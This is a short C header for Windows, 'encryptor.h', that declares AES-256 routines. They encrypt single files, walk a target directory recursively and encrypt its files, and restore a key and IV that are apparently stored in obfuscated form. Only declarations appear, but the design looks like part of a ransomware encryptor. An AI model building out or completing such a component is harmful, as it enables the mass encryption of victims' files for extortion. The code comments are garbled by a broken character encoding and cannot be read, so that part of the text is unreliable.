#ifndef ENCRYPTOR_H
#define ENCRYPTOR_H

#include <windows.h>

#define AES_KEY_SIZE   32      /* AES-256 */
#define AES_BLOCK_SIZE 16

#ifdef __cplusplus
extern "C" {
#endif

    /* ���� ���� ��ȣȭ(������ ���� API) */
    void encrypt_file(const char* filepath,
        const unsigned char* key,
        const unsigned char* iv);

    /* ���͸� ��� ��ĵ + ���� ��ȣȭ (walker.obj�� �䱸) */
    void encrypt_filescan_and_encrypt(const char* target_dir);

    /* ����ȭ ������ Ű / IV ���� �Լ� */
    void restore_key(unsigned char* key_out);
    void restore_iv(unsigned char* iv_out);

#ifdef __cplusplus
}   /* extern "C" */
#endif
#endif /* ENCRYPTOR_H */
